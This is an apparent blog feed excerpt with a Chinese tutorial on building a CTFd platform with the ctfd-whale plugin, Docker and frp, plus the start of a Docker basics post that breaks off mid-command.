    <link href="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-09-10T16:50:19.000Z</published>
    <updated>2022-09-10T16:52:49.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFd-ctfd-whale环境搭建"><a href="#CTFd-ctfd-whale环境搭建" class="headerlink" title="CTFd + ctfd-whale环境搭建"></a>CTFd + ctfd-whale环境搭建</h1><p>(参考博客: <a href="https://blog.csdn.net/qq_42111373/article/details/106398981">(109条消息) (更新)从零开始利用docker搭建CTFd动态独立靶机的靶场_Deilty的博客-CSDN博客_ctfd docker</a>，<a href="https://juejin.cn/post/6844903990522544135">手把手教你如何建立一个支持ctf动态独立靶机的靶场 - 掘金 (juejin.cn)</a> )</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h1><p>先看原理:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled.png" alt="Untitled"></p><p>自己又画了一张:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%201.png" alt="Untitled"></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="1-docker-与-docker-compose-安装"><a href="#1-docker-与-docker-compose-安装" class="headerlink" title="1.docker 与 docker-compose 安装:"></a>1.docker 与 docker-compose 安装:</h2><ol><li>卸载旧版本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><ol start="2"><li>更新包索引&amp;&amp;安装Https依赖 (好像没啥用???)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><ol start="3"><li>添加GPG密钥</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><ol start="4"><li>设置稳定版仓库(失败的话换成http)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>安装<strong><strong>Docker Engine-Community</strong></strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io   <span class="comment">#安装最新版</span></span><br></pre></td></tr></table></figure><p>更换镜像源:</p><ul><li>科大镜像：<strong><a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn/</a></strong></li><li>网易：<strong><a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a>                     (这个速度块一点)</strong></li><li>阿里云：<strong>https:&#x2F;&#x2F;&lt;你的ID&gt;.mirror.aliyuncs.com</strong></li><li>七牛云加速器：<strong><a href="https://reg-mirror.qiniu.com/">https://reg-mirror.qiniu.com</a></strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加内容&#123;&quot;registry-mirrors&quot;:[&quot;https://reg-mirror.qiniu.com/&quot;]&#125;</span></span><br><span class="line"><span class="comment">#重启docker</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>查看是否成功:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure><p>docker-compose 安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line">或者</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><h2 id="2-ctfd-ctfd-whale安装"><a href="#2-ctfd-ctfd-whale安装" class="headerlink" title="2. ctfd + ctfd-whale安装"></a>2. ctfd + ctfd-whale安装</h2><ol><li>下载文件,注意必须要git reset ,否则会失败</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git</span><br><span class="line"><span class="built_in">cd</span> CTFd/</span><br><span class="line">git reset 6c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hard <span class="comment">#回滚到当前教程适合的版本</span></span><br><span class="line"><span class="built_in">cd</span> CTFd/plugins <span class="comment">#打开ctfd插件目录</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/glzjin/CTFd-Whale.git ctfd-whale <span class="comment">#确保插件文件夹小写</span></span><br><span class="line"><span class="built_in">cd</span> ctfd-whale</span><br><span class="line">git reset 5b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard <span class="comment">#回滚到当前教程适合的版本</span></span><br><span class="line"><span class="built_in">cd</span> ../.. <span class="comment">#返回ctfd主目录</span></span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><ol start="2"><li>修改docker-compose.yml</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2.2&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8000:8000&quot;</span> <span class="comment">#第一个是访问ctfd的端口，第二个是docker端口映射出去的端口</span></span><br><span class="line">    environment:</span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span><br><span class="line">      - REDIS_URL=redis://cache:6379</span><br><span class="line">      - WORKERS=1</span><br><span class="line">      - LOG_FOLDER=/var/log/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/CTFd/logs:/var/log/CTFd</span><br><span class="line">      - .data/CTFd/uploads:/var/uploads</span><br><span class="line">      - .:/opt/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock <span class="comment">#添加这句即可，调用docker api需要这个???</span></span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    networks:</span><br><span class="line">        default:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:10.4.12 <span class="comment">#这里改成10.4.12，10.4.13会出错</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/mysql:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    <span class="built_in">command</span>: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]</span><br><span class="line"></span><br><span class="line">  cache:</span><br><span class="line">    image: redis:4</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">    - .data/redis:/data</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">    default:</span><br><span class="line">    internal:</span><br><span class="line">        internal: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ol start="3"><li>修改dockerfile (这里是把python版本也改了，默认是2.7，但是2.7试了下会失败)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.6-alpine</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27;</span> /etc/apk/repositories &amp;&amp;\</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    apk add python3 python3-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev g++</span><br><span class="line">RUN adduser -D -u 1001 -s /bin/bash ctfd</span><br><span class="line">WORKDIR /opt/CTFd</span><br><span class="line">RUN <span class="built_in">mkdir</span> -p /opt/CTFd /var/log/CTFd /var/uploads</span><br><span class="line">RUN pip3 config <span class="built_in">set</span> global.index-url https://pypi.doubanio.com/simple</span><br><span class="line">RUN pip3 config <span class="built_in">set</span> install.trusted-host pypi.doubanio.com</span><br><span class="line">COPY requirements.txt .</span><br><span class="line">RUN pip install -r requirements.txt -i  https://pypi.doubanio.com/simple</span><br><span class="line">COPY . /opt/CTFd</span><br><span class="line">RUN <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span><br><span class="line">        pip install -r <span class="variable">$d</span>/requirements.txt -i  https://pypi.doubanio.com/simple; \</span><br><span class="line">      <span class="keyword">fi</span>; \</span><br><span class="line">    <span class="keyword">done</span>;</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /opt/CTFd/docker-entrypoint.sh</span><br><span class="line">RUN <span class="built_in">chown</span> -R 1001:1001 /opt/CTFd</span><br><span class="line">RUN <span class="built_in">chown</span> -R 1001:1001 /var/log/CTFd /var/uploads</span><br><span class="line">USER 1001</span><br><span class="line">EXPOSE 8000</span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span><br></pre></td></tr></table></figure><ol start="4"><li>在CTFd目录qiurements.txt添加：banal&#x3D;&#x3D;0.4.2 (这里不知道为什么)</li><li>构建并启动</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build &amp;&amp; docker-compose up </span><br><span class="line"><span class="comment">##后台启动需要加上-d</span></span><br><span class="line"></span><br><span class="line">docker-compose down <span class="comment">#停止</span></span><br></pre></td></tr></table></figure><h2 id="3-创建网络"><a href="#3-创建网络" class="headerlink" title="3. 创建网络"></a>3. 创建网络</h2><ol><li>创建ctfd_frp-containers网络</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create ctfd_frp-containers</span><br></pre></td></tr></table></figure><ol start="2"><li>创建frpcadmin网络 (frpc容器与ctfd容器需要一起处于这个网络中，因为ctfd要与frpc通信)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create frpcadmin</span><br></pre></td></tr></table></figure><h2 id="4-frp安装"><a href="#4-frp安装" class="headerlink" title="4. frp安装"></a>4. frp安装</h2><p>需要在ubuntu linux 上安装frps转发连接到frpc，frpc继续转发到靶机 (frpc是装在容器里面的并与靶机处于一个网络)</p><p>下载frp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.29.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><ol><li>启动frps</li></ol><p>先修改frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7897</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">token = thisistoken</span><br></pre></td></tr></table></figure><p>然后启动(或者弄到systemctl里面):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><ol start="2"><li>创建一个容器并在这个容器里面安装frpc，我们将其称为frpc容器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it container:frpc         <span class="comment">#这里根据实际情况写, </span></span><br></pre></td></tr></table></figure><p>将容器加入到frpcadmin网络和ctfd_frp-containers网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network connect  frpcadmin &lt;ID&gt;</span><br><span class="line">sudo docker network connect  ctfd_frp-containers &lt;ID&gt;</span><br></pre></td></tr></table></figure><p>在容器内执行命令下载frpc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.29.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>查看frpc容器在frpcadmin内的IP地值并记下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network inspect frpcadmin</span><br></pre></td></tr></table></figure><p>编辑frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.17.0.1 <span class="comment"># 这里填写宿主机ifconfig之后docker0的ip,要能连到frps</span></span><br><span class="line">server_port = 7897</span><br><span class="line">token=thisistoken</span><br><span class="line"></span><br><span class="line">admin_addr = 172.17.0.2   <span class="comment">#这个是监听的ip ,需要填frpc容器在frpcadmin网络内的ip</span></span><br><span class="line"><span class="comment">#因为ctfd要与这个通信,需要处于一个网络中,这个就填上一步看到的IP</span></span><br><span class="line"></span><br><span class="line">admin_port = 7400         <span class="comment">#这个是监听的端口...</span></span><br><span class="line"><span class="comment">#log_file = ./frps.log</span></span><br></pre></td></tr></table></figure><p>启动frpc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><h2 id="5-启动ctfd"><a href="#5-启动ctfd" class="headerlink" title="5. 启动ctfd"></a>5. 启动ctfd</h2><p>启动docker 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up </span><br></pre></td></tr></table></figure><p>将ctfd加入到frpcadmin网络中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network connect  frpcadmin &lt;ID&gt;</span><br></pre></td></tr></table></figure><p>进入后台开始配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000</span><br></pre></td></tr></table></figure><h2 id="6-配置ctfd-whale"><a href="#6-配置ctfd-whale" class="headerlink" title="6. 配置ctfd-whale"></a>6. 配置ctfd-whale</h2><p>这里直接引用其他大佬文章内的图片</p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%202.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%203.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%204.png" alt="Untitled"></p><h2 id="7-添加题目"><a href="#7-添加题目" class="headerlink" title="7. 添加题目"></a>7. 添加题目</h2><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%205.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%206.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/09/11/CTFd-ctfd-whale%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Untitled%207.png" alt="Untitled"></p><p>上面的80 是 外部端口映射到靶机的80端口</p><h2 id="8-flag设置"><a href="#8-flag设置" class="headerlink" title="8. flag设置"></a>8. flag设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/flag &amp;&amp; <span class="built_in">export</span> FLAG=not_flag &amp;&amp; <span class="built_in">export</span> FLAG=not_flag</span><br></pre></td></tr></table></figure><p>示例Dockerfile</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span>    ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \</span></span><br><span class="line"><span class="language-bash">&amp;&amp;apt-get install -y netcat</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash">     useradd ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash">start.sh /tmp/start.sh</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash">main /home/ctf/pwn</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"><span class="built_in">chmod</span> 777 /home/ctf \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">chmod</span> +x /tmp/start.sh \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">chmod</span> +x /home/ctf/pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/flag \</span></span><br><span class="line"><span class="language-bash">&amp;&amp;<span class="built_in">export</span> FLAG=not_flag \</span></span><br><span class="line"><span class="language-bash">&amp;&amp;FLAG=not_flag\</span></span><br><span class="line"><span class="language-bash">&amp;&amp;/tmp/start.sh</span></span><br></pre></td></tr></table></figure><p>构建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t pwn:<span class="built_in">test</span> .</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFd-ctfd-whale环境搭建&quot;&gt;&lt;a href=&quot;#CTFd-ctfd-whale环境搭建&quot; class=&quot;headerlink&quot; title=&quot;CTFd + ctfd-whale环境搭建&quot;&gt;&lt;/a&gt;CTFd + ctfd-whale环境搭建&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://h4ckf0rfun.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>docker学习(1)</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/09/docker%E5%AD%A6%E4%B9%A0-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/09/docker%E5%AD%A6%E4%B9%A0-1/</id>
    <published>2022-09-09T14:17:34.000Z</published>
    <updated>2022-09-09T14:18:34.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker学习"><a href="#Docker学习" class="headerlink" title="Docker学习"></a>Docker学习</h1><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol><li>卸载旧版本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><ol start="2"><li>更新包索引&amp;&amp;安装Https依赖 (好像没啥用???)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><ol start="3"><li>添加GPG密钥</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><ol start="4"><li>设置稳定版仓库(失败的话换成http)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>安装<strong><strong>Docker Engine-Community</strong></strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io   <span class="comment">#安装最新版</span></span><br></pre></td></tr></table></figure><h1 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源:"></a>更换镜像源:</h1><ul><li>科大镜像：<strong><a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn/</a></strong></li><li>网易：<strong><a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a>                     (这个速度块一点)</strong></li><li>阿里云：<strong>https:&#x2F;&#x2F;&lt;你的ID&gt;.mirror.aliyuncs.com</strong></li><li>七牛云加速器：<strong><a href="https://reg-mirror.qiniu.com/">https://reg-mirror.qiniu.com</a></strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加内容&#123;&quot;registry-mirrors&quot;:[&quot;https://reg-mirror.qiniu.com/&quot;]&#125;</span></span><br><span class="line"><span class="comment">#重启docker</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>查看是否成功:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure><h1 id="docker镜像使用"><a href="#docker镜像使用" class="headerlink" title="docker镜像使用"></a>docker镜像使用</h1><ol><li>列出本地镜像 (拉取后的镜像会保存在本地)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>各个选项说明:</p><ul><li><strong>REPOSITORY：</strong>表示镜像的仓库源</li><li><strong>TAG：</strong>镜像的标签</li><li><strong>IMAGE ID：</strong>镜像ID</li><li><strong>CREATED：</strong>镜像创建时间</li><li><strong>SIZE：</strong>镜像大小</li></ul><ol start="2"><li>当运行容器时，使用的镜像如果在本地中不存在，docker 就会自动从 docker 镜像仓库中下载，默认是从 Docker Hub 公共镜像源下载。</li></ol><p>(创建并运行一个容器)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i ubuntu:15.10 /bin/bash</span><br></pre></td></tr></table></figure><ol start="3"><li>拉取镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:13.10</span><br></pre></td></tr></table></figure><ol start="4"><li>搜索镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search xxxxx</span><br></pre></td></tr></table></figure><ol start="5"><li>删除镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi xxxxx</span><br></pre></td></tr></table></figure><h1 id="修改镜像-amp-amp-提交"><a href="#修改镜像-amp-amp-提交" class="headerlink" title="修改镜像&amp;&amp;提交"></a>修改镜像&amp;&amp;提交</h1><p>运行指定的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run  -it ubuntu:20.04</span><br></pre></td></tr></table></figure><p>查看容器ID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker 